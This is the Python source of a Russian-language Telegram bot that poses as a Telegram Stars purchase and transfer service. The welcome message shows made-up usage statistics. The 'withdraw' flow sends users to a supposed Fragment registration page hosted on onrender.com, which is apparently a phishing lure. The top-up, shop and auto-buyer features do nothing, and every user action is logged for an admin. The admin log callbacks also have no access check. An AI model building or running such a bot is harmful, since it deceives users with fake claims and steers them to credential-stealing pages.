import asyncio
import logging
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
import sqlite3

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Вставьте ваш токен бота
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# База данных
def init_db():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    
    # Таблица пользователей
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        registration_date TEXT,
        stars_balance INTEGER DEFAULT 0,
        can_create_checks INTEGER DEFAULT 0,
        neptun_team INTEGER DEFAULT 0
    )''')
    
    # Таблица чеков
    c.execute('''CREATE TABLE IF NOT EXISTS checks (
        check_id INTEGER PRIMARY KEY AUTOINCREMENT,
        creator_id INTEGER,
        stars_amount INTEGER,
        photo_url TEXT,
        created_date TEXT,
        activated INTEGER DEFAULT 0,
        activator_id INTEGER
    )''')
    
    # Таблица логов (для админ-панели)
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        log_id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        action TEXT,
        timestamp TEXT,
        visible INTEGER DEFAULT 1
    )''')
    
    conn.commit()
    conn.close()

init_db()

# Состояния для FSM
class CheckStates(StatesGroup):
    waiting_for_amount = State()
    waiting_for_photo = State()

# Функции для работы с БД
def add_user(user_id, username, first_name):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    reg_date = datetime.now().isoformat()
    c.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, registration_date) VALUES (?, ?, ?, ?)',
              (user_id, username, first_name, reg_date))
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def update_stars_balance(user_id, amount):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('UPDATE users SET stars_balance = stars_balance + ? WHERE user_id = ?', (amount, user_id))
    conn.commit()
    conn.close()

def can_create_check(user_id):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('SELECT registration_date, neptun_team FROM users WHERE user_id = ?', (user_id,))
    result = c.fetchone()
    conn.close()
    
    if not result:
        return False
    
    reg_date_str, neptun_team = result
    
    # Если есть команда neptunteam - может создавать
    if neptun_team == 1:
        return True
    
    # Проверка 21 день
    reg_date = datetime.fromisoformat(reg_date_str)
    days_passed = (datetime.now() - reg_date).days
    
    return days_passed >= 21

def add_log(user_id, username, action):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    timestamp = datetime.now().isoformat()
    c.execute('INSERT INTO logs (user_id, username, action, timestamp) VALUES (?, ?, ?, ?)',
              (user_id, username, action, timestamp))
    conn.commit()
    conn.close()

def get_logs(visible_only=True):
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    if visible_only:
        c.execute('SELECT * FROM logs WHERE visible = 1 ORDER BY timestamp DESC LIMIT 50')
    else:
        c.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT 50')
    logs = c.fetchall()
    conn.close()
    return logs

def hide_all_logs():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('UPDATE logs SET visible = 0')
    conn.commit()
    conn.close()

# Клавиатуры
def main_keyboard(user_id):
    user = get_user(user_id)
    stars = user[4] if user else 0
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Веб-Кошелек", web_app=WebAppInfo(url="https://stars-zdgz.onrender.com"))],
        [InlineKeyboardButton(text="🔔 Вывести звезды", callback_data="withdraw_stars")],
        [InlineKeyboardButton(text="🎁 Автоскупщик подарков", callback_data="auto_buyer")],
        [InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet"),
         InlineKeyboardButton(text="🛒 Магазин", callback_data="shop")],
        [InlineKeyboardButton(text="💰 Пополнить Баланс", callback_data="refill")],
        [InlineKeyboardButton(text="👑 Создать чек", callback_data="create_check")]
    ])
    return keyboard

# Обработчики команд
@dp.message(CommandStart())
async def start_handler(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or "unknown"
    first_name = message.from_user.first_name or "User"
    
    add_user(user_id, username, first_name)
    add_log(user_id, username, "Запустил бота /start")
    
    welcome_text = """👋 Привет! Это удобный бот для покупки/передачи звезд в Telegram.

С помощью него можно моментально покупать и передавать звезды.

Бот работает почти год, и с помощью него куплена большая доля звезд в Telegram.

С помощью бота куплено:
7,357,760 ⭐️ (~ $110,366)"""
    
    await message.answer(welcome_text, reply_markup=main_keyboard(user_id))

@dp.message(Command("neptunteam"))
async def neptun_team_handler(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username or "unknown"
    
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('UPDATE users SET neptun_team = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()
    
    add_log(user_id, username, "Активировал команду /neptunteam")
    
    await message.answer("✅ Теперь вы можете создавать чеки!")

@dp.message(Command("admin"))
async def admin_panel_handler(message: Message):
    # ЗАМЕНИТЕ НА ВАШ USER_ID
    ADMIN_ID = 123456789  # Ваш реальный Telegram ID
    
    if message.from_user.id != ADMIN_ID:
        return
    
    logs = get_logs(visible_only=True)
    
    if not logs:
        await message.answer("📊 Логов пока нет")
        return
    
    log_text = "📊 *Логи активности:*\n\n"
    
    for log in logs[:20]:  # Показываем последние 20
        log_id, user_id, username, action, timestamp, visible = log
        time = datetime.fromisoformat(timestamp).strftime("%d.%m.%Y %H:%M")
        log_text += f"🔹 [{time}] @{username} ({user_id})\n   {action}\n\n"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🗑 Очистить логи", callback_data="clear_logs")],
        [InlineKeyboardButton(text="👁 Показать скрытые", callback_data="show_hidden_logs")]
    ])
    
    await message.answer(log_text, reply_markup=keyboard, parse_mode="Markdown")

# Обработчики callback
@dp.callback_query(F.data == "withdraw_stars")
async def withdraw_stars_handler(callback: CallbackQuery):
    user_id = callback.from_user.id
    username = callback.from_user.username or "unknown"
    
    add_log(user_id, username, "Нажал на 'Вывести звезды'")
    
    text = """❌ Нужен аккаунт на Fragment от Telegram, иначе вывод не получится.
Зарегистрируйся по кнопке ниже."""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Регистрация Fragment", url="https://stars-zdgz.onrender.com")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")]
    ])
    
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(F.data == "wallet")
async def wallet_handler(callback: CallbackQuery):
    user_id = callback.from_user.id
    username = callback.from_user.username or "unknown"
    user = get_user(user_id)
    
    stars = user[4] if user else 0
    
    add_log(user_id, username, "Просмотрел кошелек")
    
    text = f"👛 *Ваш кошелек*\n\n💫 Баланс: {stars:,} ⭐️"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")]
    ])
    
    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()

@dp.callback_query(F.data == "create_check")
async def create_check_handler(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    username = callback.from_user.username or "unknown"
    
    add_log(user_id, username, "Попытка создать чек")
    
    if not can_create_check(user_id):
        text = """⏳ Недостаточно прав для создания чека

Ваш аккаунт недавно зарегистрировался в боте.
Пожалуйста, подождите 21 день.


💡 Или используйте команду /neptunteam для получения доступа."""
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_main")]
        ])
        
        await callback.message.edit_text(text, reply_markup=keyboard)
        await callback.answer()
        return
    
    await state.set_state(CheckStates.waiting_for_amount)
    await callback.message.edit_text("💫 Введите количество звезд для чека:")
    await callback.answer()

@dp.message(CheckStates.waiting_for_amount)
async def check_amount_handler(message: Message, state: FSMContext):
    try:
        amount = int(message.text)
        if amount <= 0:
            await message.answer("❌ Количество должно быть больше 0")
            return
        
        user = get_user(message.from_user.id)
        stars = user[4] if user else 0
        
        if stars < amount:
            await message.answer(f"❌ Недостаточно звезд. Ваш баланс: {stars} ⭐️")
            return
        
        await state.update_data(amount=amount)
        await state.set_state(CheckStates.waiting_for_photo)
        await message.answer("📸 Теперь отправьте фото для чека:")
        
    except ValueError:
        await message.answer("❌ Пожалуйста, введите число")

@dp.message(CheckStates.waiting_for_photo, F.photo)
async def check_photo_handler(message: Message, state: FSMContext):
    user_id = message.from_user.id
    username = message.from_user.username or "unknown"
    
    data = await state.get_data()
    amount = data['amount']
    
    photo = message.photo[-1]
    photo_id = photo.file_id
    
    # Сохраняем чек в БД
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    created_date = datetime.now().isoformat()
    c.execute('INSERT INTO checks (creator_id, stars_amount, photo_url, created_date) VALUES (?, ?, ?, ?)',
              (user_id, amount, photo_id, created_date))
    check_id = c.lastrowid
    conn.commit()
    conn.close()
    
    # Списываем звезды
    update_stars_balance(user_id, -amount)
    
    add_log(user_id, username, f"Создал чек на {amount} ⭐️")
    
    await message.answer_photo(
        photo=photo_id,
        caption=f"✅ Чек создан!\n\n💫 Сумма: {amount} ⭐️\n🔗 ID чека: {check_id}"
    )
    
    await state.clear()

@dp.callback_query(F.data == "back_main")
async def back_main_handler(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    welcome_text = """👋 Привет! Это удобный бот для покупки/передачи звезд в Telegram.

С помощью него можно моментально покупать и передавать звезды.

Бот работает почти год, и с помощью него куплена большая доля звезд в Telegram.

С помощью бота куплено:
7,357,760 ⭐️ (~ $110,366)"""
    
    await callback.message.edit_text(welcome_text, reply_markup=main_keyboard(user_id))
    await callback.answer()

@dp.callback_query(F.data == "auto_buyer")
async def auto_buyer_handler(callback: CallbackQuery):
    await callback.answer("🎁 Автоскупщик подарков в разработке", show_alert=True)

@dp.callback_query(F.data == "shop")
async def shop_handler(callback: CallbackQuery):
    await callback.answer("🛒 Магазин в разработке", show_alert=True)

@dp.callback_query(F.data == "refill")
async def refill_handler(callback: CallbackQuery):
    await callback.answer("💰 Пополнение в разработке", show_alert=True)

@dp.callback_query(F.data == "clear_logs")
async def clear_logs_handler(callback: CallbackQuery):
    hide_all_logs()
    await callback.answer("🗑 Логи скрыты", show_alert=True)
    await callback.message.edit_text("✅ Все логи скрыты")

@dp.callback_query(F.data == "show_hidden_logs")
async def show_hidden_logs_handler(callback: CallbackQuery):
    logs = get_logs(visible_only=False)
    
    log_text = "📊 *Все логи (включая скрытые):*\n\n"
    
    for log in logs[:20]:
        log_id, user_id, username, action, timestamp, visible = log
        time = datetime.fromisoformat(timestamp).strftime("%d.%m.%Y %H:%M")
        status = "👁" if visible else "🔒"
        log_text += f"{status} [{time}] @{username} ({user_id})\n   {action}\n\n"
    
    await callback.message.edit_text(log_text, parse_mode="Markdown")
    await callback.answer()

# Запуск бота
async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
